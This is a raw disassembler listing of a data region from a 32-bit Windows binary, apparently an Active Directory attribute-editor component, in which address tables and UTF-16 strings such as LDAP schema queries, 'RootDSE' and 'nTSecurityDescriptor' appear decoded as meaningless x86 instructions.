  4023c7:	00 8a 06 43 00 84    	add    %cl,-0x7bffbcfa(%edx)
  4023cd:	06                   	push   %es
  4023ce:	43                   	inc    %ebx
  4023cf:	00 d1                	add    %dl,%cl
  4023d1:	c0 40 00 78          	rolb   $0x78,0x0(%eax)
  4023d5:	06                   	push   %es
  4023d6:	43                   	inc    %ebx
  4023d7:	00 5f c1             	add    %bl,-0x3f(%edi)
  4023da:	40                   	inc    %eax
  4023db:	00 6c 06 43          	add    %ch,0x43(%esi,%eax,1)
  4023df:	00 66 06             	add    %ah,0x6(%esi)
  4023e2:	43                   	inc    %ebx
  4023e3:	00 0a                	add    %cl,(%edx)
  4023e5:	c2 40 00             	ret    $0x40
  4023e8:	57                   	push   %edi
  4023e9:	c2 40 00             	ret    $0x40
  4023ec:	00 00                	add    %al,(%eax)
  4023ee:	00 00                	add    %al,(%eax)
  4023f0:	30 7c 40 00          	xor    %bh,0x0(%eax,%eax,2)
  4023f4:	a8 06                	test   $0x6,%al
  4023f6:	43                   	inc    %ebx
  4023f7:	00 c3                	add    %al,%bl
  4023f9:	d5 40                	aad    $0x40
  4023fb:	00 94 60 41 00 30 44 	add    %dl,0x44300041(%eax,%eiz,2)
  402402:	41                   	inc    %ecx
  402403:	00 94 60 41 00 a2 06 	add    %dl,0x6a20041(%eax,%eiz,2)
  40240a:	43                   	inc    %ebx
  40240b:	00 30                	add    %dh,(%eax)
  40240d:	06                   	push   %es
  40240e:	43                   	inc    %ebx
  40240f:	00 2a                	add    %ch,(%edx)
  402411:	06                   	push   %es
  402412:	43                   	inc    %ebx
  402413:	00 24 06             	add    %ah,(%esi,%eax,1)
  402416:	43                   	inc    %ebx
  402417:	00 1e                	add    %bl,(%esi)
  402419:	06                   	push   %es
  40241a:	43                   	inc    %ebx
  40241b:	00 18                	add    %bl,(%eax)
  40241d:	06                   	push   %es
  40241e:	43                   	inc    %ebx
  40241f:	00 12                	add    %dl,(%edx)
  402421:	06                   	push   %es
  402422:	43                   	inc    %ebx
  402423:	00 85 cb 40 00 0c    	add    %al,0xc0040cb(%ebp)
  402429:	06                   	push   %es
  40242a:	43                   	inc    %ebx
  40242b:	00 06                	add    %al,(%esi)
  40242d:	06                   	push   %es
  40242e:	43                   	inc    %ebx
  40242f:	00 00                	add    %al,(%eax)
  402431:	06                   	push   %es
  402432:	43                   	inc    %ebx
  402433:	00 fa                	add    %bh,%dl
  402435:	05 43 00 f4 05       	add    $0x5f40043,%eax
  40243a:	43                   	inc    %ebx
  40243b:	00 ee                	add    %ch,%dh
  40243d:	05 43 00 e8 05       	add    $0x5e80043,%eax
  402442:	43                   	inc    %ebx
  402443:	00 e2                	add    %ah,%dl
  402445:	05 43 00 dc 05       	add    $0x5dc0043,%eax
  40244a:	43                   	inc    %ebx
  40244b:	00 d6                	add    %dl,%dh
  40244d:	05 43 00 d0 05       	add    $0x5d00043,%eax
  402452:	43                   	inc    %ebx
  402453:	00 ca                	add    %cl,%dl
  402455:	05 43 00 c4 05       	add    $0x5c40043,%eax
  40245a:	43                   	inc    %ebx
  40245b:	00 be 05 43 00 b8    	add    %bh,-0x47ffbcfb(%esi)
  402461:	05 43 00 b2 05       	add    $0x5b20043,%eax
  402466:	43                   	inc    %ebx
  402467:	00 ac 05 43 00 a6 05 	add    %ch,0x5a60043(%ebp,%eax,1)
  40246e:	43                   	inc    %ebx
  40246f:	00 a0 05 43 00 9a    	add    %ah,-0x65ffbcfb(%eax)
  402475:	05 43 00 94 05       	add    $0x5940043,%eax
  40247a:	43                   	inc    %ebx
  40247b:	00 8e 05 43 00 94    	add    %cl,-0x6bffbcfb(%esi)
  402481:	60                   	pusha
  402482:	41                   	inc    %ecx
  402483:	00 88 a9 40 00 94    	add    %cl,-0x6bffbf57(%eax)
  402489:	a9 40 00 9c 06       	test   $0x69c0040,%eax
  40248e:	43                   	inc    %ebx
  40248f:	00 82 05 43 00 7c    	add    %al,0x7c004305(%edx)
  402495:	05 43 00 76 05       	add    $0x5760043,%eax
  40249a:	43                   	inc    %ebx
  40249b:	00 70 05             	add    %dh,0x5(%eax)
  40249e:	43                   	inc    %ebx
  40249f:	00 6a 05             	add    %ch,0x5(%edx)
  4024a2:	43                   	inc    %ebx
  4024a3:	00 96 06 43 00 90    	add    %dl,-0x6fffbcfa(%esi)
  4024a9:	06                   	push   %es
  4024aa:	43                   	inc    %ebx
  4024ab:	00 58 05             	add    %bl,0x5(%eax)
  4024ae:	43                   	inc    %ebx
  4024af:	00 8a 06 43 00 84    	add    %cl,-0x7bffbcfa(%edx)
  4024b5:	06                   	push   %es
  4024b6:	43                   	inc    %ebx
  4024b7:	00 8b cb 40 00 78    	add    %cl,0x780040cb(%ebx)
  4024bd:	06                   	push   %es
  4024be:	43                   	inc    %ebx
  4024bf:	00 94 cb 40 00 6c 06 	add    %dl,0x66c0040(%ebx,%ecx,8)
  4024c6:	43                   	inc    %ebx
  4024c7:	00 66 06             	add    %ah,0x6(%esi)
  4024ca:	43                   	inc    %ebx
  4024cb:	00 c9                	add    %cl,%cl
  4024cd:	cb                   	lret
  4024ce:	40                   	inc    %eax
  4024cf:	00 94 cc 40 00 20 00 	add    %dl,0x200040(%esp,%ecx,8)
  4024d6:	00 00                	add    %al,(%eax)
  4024d8:	61                   	popa
  4024d9:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  4024dd:	00 72 00             	add    %dh,0x0(%edx)
  4024e0:	65 00 64 00 69       	add    %ah,%gs:0x69(%eax,%eax,1)
  4024e5:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  4024e9:	00 00                	add    %al,(%eax)
  4024eb:	00 3b                	add    %bh,(%ebx)
  4024ed:	00 72 00             	add    %dh,0x0(%edx)
  4024f0:	61                   	popa
  4024f1:	00 6e 00             	add    %ch,0x0(%esi)
  4024f4:	67 00 65 00          	add    %ah,0x0(%di)
  4024f8:	3d 00 00 00 78       	cmp    $0x78000000,%eax
  4024fd:	7c 40                	jl     0x40253f
  4024ff:	00 16                	add    %dl,(%esi)
  402501:	05 43 00 58 f7       	add    $0xf7580043,%eax
  402506:	40                   	inc    %eax
  402507:	00 1a                	add    %bl,(%edx)
  402509:	62 41 00             	bound  %eax,0x0(%ecx)
  40250c:	30 44 41 00          	xor    %al,0x0(%ecx,%eax,2)
  402510:	94                   	xchg   %eax,%esp
  402511:	60                   	pusha
  402512:	41                   	inc    %ecx
  402513:	00 c0                	add    %al,%al
  402515:	7c 40                	jl     0x402557
  402517:	00 16                	add    %dl,(%esi)
  402519:	05 43 00 6b f1       	add    $0xf16b0043,%eax
  40251e:	40                   	inc    %eax
  40251f:	00 1a                	add    %bl,(%edx)
  402521:	62 41 00             	bound  %eax,0x0(%ecx)
  402524:	30 44 41 00          	xor    %al,0x0(%ecx,%eax,2)
  402528:	94                   	xchg   %eax,%esp
  402529:	60                   	pusha
  40252a:	41                   	inc    %ecx
  40252b:	00 08                	add    %cl,(%eax)
  40252d:	7d 40                	jge    0x40256f
  40252f:	00 16                	add    %dl,(%esi)
  402531:	05 43 00 87 f1       	add    $0xf1870043,%eax
  402536:	40                   	inc    %eax
  402537:	00 1a                	add    %bl,(%edx)
  402539:	62 41 00             	bound  %eax,0x0(%ecx)
  40253c:	30 44 41 00          	xor    %al,0x0(%ecx,%eax,2)
  402540:	94                   	xchg   %eax,%esp
  402541:	60                   	pusha
  402542:	41                   	inc    %ecx
  402543:	00 50 7d             	add    %dl,0x7d(%eax)
  402546:	40                   	inc    %eax
  402547:	00 16                	add    %dl,(%esi)
  402549:	05 43 00 a3 f1       	add    $0xf1a30043,%eax
  40254e:	40                   	inc    %eax
  40254f:	00 1a                	add    %bl,(%edx)
  402551:	62 41 00             	bound  %eax,0x0(%ecx)
  402554:	30 44 41 00          	xor    %al,0x0(%ecx,%eax,2)
  402558:	94                   	xchg   %eax,%esp
  402559:	60                   	pusha
  40255a:	41                   	inc    %ecx
  40255b:	00 00                	add    %al,(%eax)
  40255d:	00 00                	add    %al,(%eax)
  40255f:	00 a8 7d 40 00 a8    	add    %ch,-0x57ffbf83(%eax)
  402565:	06                   	push   %es
  402566:	43                   	inc    %ebx
  402567:	00 a7 d5 40 00 94    	add    %ah,-0x6bffbf2b(%edi)
  40256d:	60                   	pusha
  40256e:	41                   	inc    %ecx
  40256f:	00 30                	add    %dh,(%eax)
  402571:	44                   	inc    %esp
  402572:	41                   	inc    %ecx
  402573:	00 94 60 41 00 a2 06 	add    %dl,0x6a20041(%eax,%eiz,2)
  40257a:	43                   	inc    %ebx
  40257b:	00 30                	add    %dh,(%eax)
  40257d:	06                   	push   %es
  40257e:	43                   	inc    %ebx
  40257f:	00 2a                	add    %ch,(%edx)
  402581:	06                   	push   %es
  402582:	43                   	inc    %ebx
  402583:	00 24 06             	add    %ah,(%esi,%eax,1)
  402586:	43                   	inc    %ebx
  402587:	00 1e                	add    %bl,(%esi)
  402589:	06                   	push   %es
  40258a:	43                   	inc    %ebx
  40258b:	00 18                	add    %bl,(%eax)
  40258d:	06                   	push   %es
  40258e:	43                   	inc    %ebx
  40258f:	00 12                	add    %dl,(%edx)
  402591:	06                   	push   %es
  402592:	43                   	inc    %ebx
  402593:	00 90 c4 40 00 0c    	add    %dl,0xc0040c4(%eax)
  402599:	06                   	push   %es
  40259a:	43                   	inc    %ebx
  40259b:	00 06                	add    %al,(%esi)
  40259d:	06                   	push   %es
  40259e:	43                   	inc    %ebx
  40259f:	00 00                	add    %al,(%eax)
  4025a1:	06                   	push   %es
  4025a2:	43                   	inc    %ebx
  4025a3:	00 fa                	add    %bh,%dl
  4025a5:	05 43 00 f4 05       	add    $0x5f40043,%eax
  4025aa:	43                   	inc    %ebx
  4025ab:	00 ee                	add    %ch,%dh
  4025ad:	05 43 00 e8 05       	add    $0x5e80043,%eax
  4025b2:	43                   	inc    %ebx
  4025b3:	00 e2                	add    %ah,%dl
  4025b5:	05 43 00 dc 05       	add    $0x5dc0043,%eax
  4025ba:	43                   	inc    %ebx
  4025bb:	00 d6                	add    %dl,%dh
  4025bd:	05 43 00 d0 05       	add    $0x5d00043,%eax
  4025c2:	43                   	inc    %ebx
  4025c3:	00 ca                	add    %cl,%dl
  4025c5:	05 43 00 c4 05       	add    $0x5c40043,%eax
  4025ca:	43                   	inc    %ebx
  4025cb:	00 be 05 43 00 b8    	add    %bh,-0x47ffbcfb(%esi)
  4025d1:	05 43 00 b2 05       	add    $0x5b20043,%eax
  4025d6:	43                   	inc    %ebx
  4025d7:	00 ac 05 43 00 a6 05 	add    %ch,0x5a60043(%ebp,%eax,1)
  4025de:	43                   	inc    %ebx
  4025df:	00 a0 05 43 00 9a    	add    %ah,-0x65ffbcfb(%eax)
  4025e5:	05 43 00 94 05       	add    $0x5940043,%eax
  4025ea:	43                   	inc    %ebx
  4025eb:	00 8e 05 43 00 94    	add    %cl,-0x6bffbcfb(%esi)
  4025f1:	60                   	pusha
  4025f2:	41                   	inc    %ecx
  4025f3:	00 88 a9 40 00 94    	add    %cl,-0x6bffbf57(%eax)
  4025f9:	a9 40 00 9c 06       	test   $0x69c0040,%eax
  4025fe:	43                   	inc    %ebx
  4025ff:	00 82 05 43 00 7c    	add    %al,0x7c004305(%edx)
  402605:	05 43 00 76 05       	add    $0x5760043,%eax
  40260a:	43                   	inc    %ebx
  40260b:	00 70 05             	add    %dh,0x5(%eax)
  40260e:	43                   	inc    %ebx
  40260f:	00 6a 05             	add    %ch,0x5(%edx)
  402612:	43                   	inc    %ebx
  402613:	00 96 06 43 00 90    	add    %dl,-0x6fffbcfa(%esi)
  402619:	06                   	push   %es
  40261a:	43                   	inc    %ebx
  40261b:	00 58 05             	add    %bl,0x5(%eax)
  40261e:	43                   	inc    %ebx
  40261f:	00 8a 06 43 00 84    	add    %cl,-0x7bffbcfa(%edx)
  402625:	06                   	push   %es
  402626:	43                   	inc    %ebx
  402627:	00 96 c4 40 00 78    	add    %dl,0x780040c4(%esi)
  40262d:	06                   	push   %es
  40262e:	43                   	inc    %ebx
  40262f:	00 5e c5             	add    %bl,-0x3b(%esi)
  402632:	40                   	inc    %eax
  402633:	00 6c 06 43          	add    %ch,0x43(%esi,%eax,1)
  402637:	00 66 06             	add    %ah,0x6(%esi)
  40263a:	43                   	inc    %ebx
  40263b:	00 86 c9 40 00 03    	add    %al,0x30040c9(%esi)
  402641:	ca 40 00             	lret   $0x40
  402644:	00 00                	add    %al,(%eax)
  402646:	00 00                	add    %al,(%eax)
  402648:	25 00 64 00 00       	and    $0x6400,%eax
  40264d:	00 00                	add    %al,(%eax)
  40264f:	00 73 00             	add    %dh,0x0(%ebx)
  402652:	63 00                	arpl   %eax,(%eax)
  402654:	68 00 65 00 6d       	push   $0x6d006500
  402659:	00 61 00             	add    %ah,0x0(%ecx)
  40265c:	4e                   	dec    %esi
  40265d:	00 61 00             	add    %ah,0x0(%ecx)
  402660:	6d                   	insl   (%dx),%es:(%edi)
  402661:	00 69 00             	add    %ch,0x0(%ecx)
  402664:	6e                   	outsb  %ds:(%esi),(%dx)
  402665:	00 67 00             	add    %ah,0x0(%edi)
  402668:	43                   	inc    %ebx
  402669:	00 6f 00             	add    %ch,0x0(%edi)
  40266c:	6e                   	outsb  %ds:(%esi),(%dx)
  40266d:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  402671:	00 78 00             	add    %bh,0x0(%eax)
  402674:	74 00                	je     0x402676
  402676:	00 00                	add    %al,(%eax)
  402678:	52                   	push   %edx
  402679:	00 6f 00             	add    %ch,0x0(%edi)
  40267c:	6f                   	outsl  %ds:(%esi),(%dx)
  40267d:	00 74 00 44          	add    %dh,0x44(%eax,%eax,1)
  402681:	00 53 00             	add    %dl,0x0(%ebx)
  402684:	45                   	inc    %ebp
  402685:	00 00                	add    %al,(%eax)
  402687:	00 46 00             	add    %al,0x0(%esi)
  40268a:	61                   	popa
  40268b:	00 69 00             	add    %ch,0x0(%ecx)
  40268e:	6c                   	insb   (%dx),%es:(%edi)
  40268f:	00 65 00             	add    %ah,0x0(%ebp)
  402692:	64 00 20             	add    %ah,%fs:(%eax)
  402695:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  402699:	00 20                	add    %ah,(%eax)
  40269b:	00 51 00             	add    %dl,0x0(%ecx)
  40269e:	49                   	dec    %ecx
  40269f:	00 20                	add    %ah,(%eax)
  4026a1:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  4026a5:	00 65 00             	add    %ah,0x0(%ebp)
  4026a8:	20 00                	and    %al,(%eax)
  4026aa:	49                   	dec    %ecx
  4026ab:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  4026af:	00 72 00             	add    %dh,0x0(%edx)
  4026b2:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4026b6:	74 00                	je     0x4026b8
  4026b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4026b9:	00 72 00             	add    %dh,0x0(%edx)
  4026bc:	79 00                	jns    0x4026be
  4026be:	4f                   	dec    %edi
  4026bf:	00 62 00             	add    %ah,0x0(%edx)
  4026c2:	6a 00                	push   $0x0
  4026c4:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4026c8:	74 00                	je     0x4026ca
  4026ca:	20 00                	and    %al,(%eax)
  4026cc:	66 00 72 00          	data16 add %dh,0x0(%edx)
  4026d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4026d1:	00 6d 00             	add    %ch,0x0(%ebp)
  4026d4:	20 00                	and    %al,(%eax)
  4026d6:	74 00                	je     0x4026d8
  4026d8:	68 00 65 00 20       	push   $0x20006500
  4026dd:	00 49 00             	add    %cl,0x0(%ecx)
  4026e0:	41                   	inc    %ecx
  4026e1:	00 44 00 73          	add    %al,0x73(%eax,%eax,1)
  4026e5:	00 2e                	add    %ch,(%esi)
  4026e7:	00 00                	add    %al,(%eax)
  4026e9:	00 00                	add    %al,(%eax)
  4026eb:	00 3b                	add    %bh,(%ebx)
  4026ed:	00 00                	add    %al,(%eax)
  4026ef:	00 6e 00             	add    %ch,0x0(%esi)
  4026f2:	54                   	push   %esp
  4026f3:	00 53 00             	add    %dl,0x0(%ebx)
  4026f6:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4026fa:	75 00                	jne    0x4026fc
  4026fc:	72 00                	jb     0x4026fe
  4026fe:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  402704:	44                   	inc    %esp
  402705:	00 65 00             	add    %ah,0x0(%ebp)
  402708:	73 00                	jae    0x40270a
  40270a:	63 00                	arpl   %eax,(%eax)
  40270c:	72 00                	jb     0x40270e
  40270e:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  402714:	6f                   	outsl  %ds:(%esi),(%dx)
  402715:	00 72 00             	add    %dh,0x0(%edx)
	...
  402720:	28 00                	sub    %al,(%eax)
  402722:	26 00 28             	add    %ch,%es:(%eax)
  402725:	00 6f 00             	add    %ch,0x0(%edi)
  402728:	62 00                	bound  %eax,(%eax)
  40272a:	6a 00                	push   $0x0
  40272c:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  402730:	74 00                	je     0x402732
  402732:	43                   	inc    %ebx
  402733:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  402737:	00 73 00             	add    %dh,0x0(%ebx)
  40273a:	73 00                	jae    0x40273c
  40273c:	3d 00 61 00 74       	cmp    $0x74006100,%eax
  402741:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  402745:	00 69 00             	add    %ch,0x0(%ecx)
  402748:	62 00                	bound  %eax,(%eax)
  40274a:	75 00                	jne    0x40274c
  40274c:	74 00                	je     0x40274e
  40274e:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  402752:	63 00                	arpl   %eax,(%eax)
  402754:	68 00 65 00 6d       	push   $0x6d006500
  402759:	00 61 00             	add    %ah,0x0(%ecx)
  40275c:	29 00                	sub    %eax,(%eax)
  40275e:	28 00                	sub    %al,(%eax)
  402760:	6c                   	insb   (%dx),%es:(%edi)
  402761:	00 44 00 41          	add    %al,0x41(%eax,%eax,1)
  402765:	00 50 00             	add    %dl,0x0(%eax)
  402768:	44                   	inc    %esp
  402769:	00 69 00             	add    %ch,0x0(%ecx)
  40276c:	73 00                	jae    0x40276e
  40276e:	70 00                	jo     0x402770
  402770:	6c                   	insb   (%dx),%es:(%edi)
  402771:	00 61 00             	add    %ah,0x0(%ecx)
  402774:	79 00                	jns    0x402776
  402776:	4e                   	dec    %esi
  402777:	00 61 00             	add    %ah,0x0(%ecx)
  40277a:	6d                   	insl   (%dx),%es:(%edi)
  40277b:	00 65 00             	add    %ah,0x0(%ebp)
  40277e:	3d 00 25 00 73       	cmp    $0x73002500,%eax
  402783:	00 29                	add    %ch,(%ecx)
  402785:	00 28                	add    %ch,(%eax)
  402787:	00 21                	add    %ah,(%ecx)
  402789:	00 69 00             	add    %ch,0x0(%ecx)
  40278c:	73 00                	jae    0x40278e
  40278e:	44                   	inc    %esp
  40278f:	00 65 00             	add    %ah,0x0(%ebp)
  402792:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  402796:	6e                   	outsb  %ds:(%esi),(%dx)
  402797:	00 63 00             	add    %ah,0x0(%ebx)
  40279a:	74 00                	je     0x40279c
  40279c:	3d 00 54 00 52       	cmp    $0x52005400,%eax
  4027a1:	00 55 00             	add    %dl,0x0(%ebp)
  4027a4:	45                   	inc    %ebp
  4027a5:	00 29                	add    %ch,(%ecx)
  4027a7:	00 29                	add    %ch,(%ecx)
  4027a9:	00 00                	add    %al,(%eax)
  4027ab:	00 61 00             	add    %ah,0x0(%ecx)
  4027ae:	74 00                	je     0x4027b0
  4027b0:	74 00                	je     0x4027b2
  4027b2:	72 00                	jb     0x4027b4
  4027b4:	69 00 62 00 75 00    	imul   $0x750062,(%eax),%eax
  4027ba:	74 00                	je     0x4027bc
  4027bc:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  4027c0:	79 00                	jns    0x4027c2
  4027c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4027c3:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  4027c7:	00 78 00             	add    %bh,0x0(%eax)
  4027ca:	00 00                	add    %al,(%eax)
  4027cc:	69 00 73 00 53 00    	imul   $0x530073,(%eax),%eax
  4027d2:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  4027d8:	6c                   	insb   (%dx),%es:(%edi)
  4027d9:	00 65 00             	add    %ah,0x0(%ebp)
  4027dc:	56                   	push   %esi
  4027dd:	00 61 00             	add    %ah,0x0(%ecx)
  4027e0:	6c                   	insb   (%dx),%es:(%edi)
  4027e1:	00 75 00             	add    %dh,0x0(%ebp)
  4027e4:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  4027e9:	00 00                	add    %al,(%eax)
  4027eb:	00 47 00             	add    %al,0x0(%edi)
  4027ee:	43                   	inc    %ebx
  4027ef:	00 3a                	add    %bh,(%edx)
  4027f1:	00 2f                	add    %ch,(%edi)
  4027f3:	00 2f                	add    %ch,(%edi)
  4027f5:	00 00                	add    %al,(%eax)
  4027f7:	00 4c 00 44          	add    %cl,0x44(%eax,%eax,1)
  4027fb:	00 41 00             	add    %al,0x0(%ecx)
  4027fe:	50                   	push   %eax
  4027ff:	00 3a                	add    %bh,(%edx)
  402801:	00 2f                	add    %ch,(%edi)
  402803:	00 2f                	add    %ch,(%edi)
  402805:	00 00                	add    %al,(%eax)
  402807:	00 00                	add    %al,(%eax)
  402809:	7e 40                	jle    0x40284b
  40280b:	00 a8 06 43 00 be    	add    %ch,-0x41ffbcfa(%eax)
  402811:	f7 40 00 94 60 41 00 	testl  $0x416094,0x0(%eax)
  402818:	30 44 41 00          	xor    %al,0x0(%ecx,%eax,2)
  40281c:	94                   	xchg   %eax,%esp
  40281d:	60                   	pusha
  40281e:	41                   	inc    %ecx
  40281f:	00 a2 06 43 00 30    	add    %ah,0x30004306(%edx)
  402825:	06                   	push   %es
  402826:	43                   	inc    %ebx
  402827:	00 2a                	add    %ch,(%edx)
  402829:	06                   	push   %es
  40282a:	43                   	inc    %ebx
  40282b:	00 24 06             	add    %ah,(%esi,%eax,1)
  40282e:	43                   	inc    %ebx
  40282f:	00 1e                	add    %bl,(%esi)
  402831:	06                   	push   %es
  402832:	43                   	inc    %ebx
  402833:	00 18                	add    %bl,(%eax)
  402835:	06                   	push   %es
  402836:	43                   	inc    %ebx
  402837:	00 12                	add    %dl,(%edx)
  402839:	06                   	push   %es
  40283a:	43                   	inc    %ebx
  40283b:	00 21                	add    %ah,(%ecx)
  40283d:	b7 40                	mov    $0x40,%bh
  40283f:	00 0c 06             	add    %cl,(%esi,%eax,1)
  402842:	43                   	inc    %ebx
  402843:	00 06                	add    %al,(%esi)
  402845:	06                   	push   %es
  402846:	43                   	inc    %ebx
  402847:	00 00                	add    %al,(%eax)
  402849:	06                   	push   %es
  40284a:	43                   	inc    %ebx
  40284b:	00 fa                	add    %bh,%dl
  40284d:	05 43 00 f4 05       	add    $0x5f40043,%eax
  402852:	43                   	inc    %ebx
  402853:	00 ee                	add    %ch,%dh
  402855:	05 43 00 e8 05       	add    $0x5e80043,%eax
  40285a:	43                   	inc    %ebx
  40285b:	00 e2                	add    %ah,%dl
  40285d:	05 43 00 dc 05       	add    $0x5dc0043,%eax
  402862:	43                   	inc    %ebx
  402863:	00 d6                	add    %dl,%dh
  402865:	05 43 00 d0 05       	add    $0x5d00043,%eax
  40286a:	43                   	inc    %ebx
  40286b:	00 ca                	add    %cl,%dl
  40286d:	05 43 00 c4 05       	add    $0x5c40043,%eax
  402872:	43                   	inc    %ebx
  402873:	00 be 05 43 00 b8    	add    %bh,-0x47ffbcfb(%esi)
  402879:	05 43 00 b2 05       	add    $0x5b20043,%eax
  40287e:	43                   	inc    %ebx
  40287f:	00 ac 05 43 00 a6 05 	add    %ch,0x5a60043(%ebp,%eax,1)
  402886:	43                   	inc    %ebx
  402887:	00 a0 05 43 00 9a    	add    %ah,-0x65ffbcfb(%eax)
  40288d:	05 43 00 94 05       	add    $0x5940043,%eax
  402892:	43                   	inc    %ebx
  402893:	00 8e 05 43 00 94    	add    %cl,-0x6bffbcfb(%esi)
  402899:	60                   	pusha
  40289a:	41                   	inc    %ecx
  40289b:	00 88 a9 40 00 94    	add    %cl,-0x6bffbf57(%eax)
  4028a1:	a9 40 00 9c 06       	test   $0x69c0040,%eax
  4028a6:	43                   	inc    %ebx
  4028a7:	00 82 05 43 00 7c    	add    %al,0x7c004305(%edx)
  4028ad:	05 43 00 76 05       	add    $0x5760043,%eax
  4028b2:	43                   	inc    %ebx
  4028b3:	00 70 05             	add    %dh,0x5(%eax)
  4028b6:	43                   	inc    %ebx
  4028b7:	00 6a 05             	add    %ch,0x5(%edx)
  4028ba:	43                   	inc    %ebx
  4028bb:	00 96 06 43 00 90    	add    %dl,-0x6fffbcfa(%esi)
  4028c1:	06                   	push   %es
  4028c2:	43                   	inc    %ebx
  4028c3:	00 58 05             	add    %bl,0x5(%eax)
  4028c6:	43                   	inc    %ebx
  4028c7:	00 8a 06 43 00 84    	add    %cl,-0x7bffbcfa(%edx)
  4028cd:	06                   	push   %es
  4028ce:	43                   	inc    %ebx
  4028cf:	00 84 d8 40 00 78 06 	add    %al,0x6780040(%eax,%ebx,8)
  4028d6:	43                   	inc    %ebx
  4028d7:	00 f0                	add    %dh,%al
  4028d9:	f8                   	clc
  4028da:	40                   	inc    %eax
  4028db:	00 6c 06 43          	add    %ch,0x43(%esi,%eax,1)
  4028df:	00 66 06             	add    %ah,0x6(%esi)
  4028e2:	43                   	inc    %ebx
  4028e3:	00 51 f9             	add    %dl,-0x7(%ecx)
  4028e6:	40                   	inc    %eax
  4028e7:	00 3e                	add    %bh,(%esi)
  4028e9:	db 40 00             	fildl  0x0(%eax)
  4028ec:	00 00                	add    %al,(%eax)
  4028ee:	00 00                	add    %al,(%eax)
  4028f0:	58                   	pop    %eax
  4028f1:	7e 40                	jle    0x402933
  4028f3:	00 a8 06 43 00 be    	add    %ch,-0x41ffbcfa(%eax)
  4028f9:	f7 40 00 94 60 41 00 	testl  $0x416094,0x0(%eax)
  402900:	30 44 41 00          	xor    %al,0x0(%ecx,%eax,2)
  402904:	94                   	xchg   %eax,%esp
  402905:	60                   	pusha
  402906:	41                   	inc    %ecx
  402907:	00 a2 06 43 00 30    	add    %ah,0x30004306(%edx)
  40290d:	06                   	push   %es
  40290e:	43                   	inc    %ebx
  40290f:	00 2a                	add    %ch,(%edx)
  402911:	06                   	push   %es
  402912:	43                   	inc    %ebx
  402913:	00 24 06             	add    %ah,(%esi,%eax,1)
  402916:	43                   	inc    %ebx
  402917:	00 1e                	add    %bl,(%esi)
  402919:	06                   	push   %es
  40291a:	43                   	inc    %ebx
  40291b:	00 18                	add    %bl,(%eax)
  40291d:	06                   	push   %es
  40291e:	43                   	inc    %ebx
  40291f:	00 12                	add    %dl,(%edx)
  402921:	06                   	push   %es
  402922:	43                   	inc    %ebx
  402923:	00 1a                	add    %bl,(%edx)
  402925:	be 40 00 0c 06       	mov    $0x60c0040,%esi
  40292a:	43                   	inc    %ebx
  40292b:	00 06                	add    %al,(%esi)
  40292d:	06                   	push   %es
  40292e:	43                   	inc    %ebx
  40292f:	00 00                	add    %al,(%eax)
  402931:	06                   	push   %es
  402932:	43                   	inc    %ebx
  402933:	00 fa                	add    %bh,%dl
  402935:	05 43 00 f4 05       	add    $0x5f40043,%eax
  40293a:	43                   	inc    %ebx
  40293b:	00 ee                	add    %ch,%dh
  40293d:	05 43 00 e8 05       	add    $0x5e80043,%eax
  402942:	43                   	inc    %ebx
  402943:	00 e2                	add    %ah,%dl
  402945:	05 43 00 dc 05       	add    $0x5dc0043,%eax
  40294a:	43                   	inc    %ebx
  40294b:	00 d6                	add    %dl,%dh
  40294d:	05 43 00 d0 05       	add    $0x5d00043,%eax
  402952:	43                   	inc    %ebx
  402953:	00 ca                	add    %cl,%dl
  402955:	05 43 00 c4 05       	add    $0x5c40043,%eax
  40295a:	43                   	inc    %ebx
  40295b:	00 be 05 43 00 b8    	add    %bh,-0x47ffbcfb(%esi)
  402961:	05 43 00 b2 05       	add    $0x5b20043,%eax
  402966:	43                   	inc    %ebx
  402967:	00 ac 05 43 00 a6 05 	add    %ch,0x5a60043(%ebp,%eax,1)
  40296e:	43                   	inc    %ebx
  40296f:	00 a0 05 43 00 9a    	add    %ah,-0x65ffbcfb(%eax)
  402975:	05 43 00 94 05       	add    $0x5940043,%eax
  40297a:	43                   	inc    %ebx
  40297b:	00 8e 05 43 00 94    	add    %cl,-0x6bffbcfb(%esi)
  402981:	60                   	pusha
  402982:	41                   	inc    %ecx
  402983:	00 88 a9 40 00 94    	add    %cl,-0x6bffbf57(%eax)
  402989:	a9 40 00 9c 06       	test   $0x69c0040,%eax
  40298e:	43                   	inc    %ebx
  40298f:	00 82 05 43 00 7c    	add    %al,0x7c004305(%edx)
  402995:	05 43 00 76 05       	add    $0x5760043,%eax
  40299a:	43                   	inc    %ebx
  40299b:	00 70 05             	add    %dh,0x5(%eax)
  40299e:	43                   	inc    %ebx
  40299f:	00 6a 05             	add    %ch,0x5(%edx)
  4029a2:	43                   	inc    %ebx
  4029a3:	00 96 06 43 00 90    	add    %dl,-0x6fffbcfa(%esi)
  4029a9:	06                   	push   %es
  4029aa:	43                   	inc    %ebx
  4029ab:	00 58 05             	add    %bl,0x5(%eax)
  4029ae:	43                   	inc    %ebx
  4029af:	00 8a 06 43 00 84    	add    %cl,-0x7bffbcfa(%edx)
  4029b5:	06                   	push   %es
  4029b6:	43                   	inc    %ebx
  4029b7:	00 07                	add    %al,(%edi)
  4029b9:	dc 40 00             	faddl  0x0(%eax)
  4029bc:	78 06                	js     0x4029c4
